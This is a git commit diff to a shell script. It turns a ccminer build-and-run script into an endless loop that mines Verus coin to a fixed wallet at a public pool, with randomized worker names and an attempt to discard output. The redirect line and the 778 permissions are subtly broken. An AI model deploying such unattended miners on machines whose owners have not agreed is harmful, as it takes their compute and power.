e4cfb8d52a15de1dfa355dde3b671a8d74f5d15d
odilon5 <93242501+odilon5@users.noreply.github.com>
2021-10-27 13:16:54 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -4,8 +4,10 @@
 
 apt update
 apt install sudo -y
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh
+apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+chmod 778 ccminer
+while true
+do
 ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
+> /dev/null 2>&1
+done
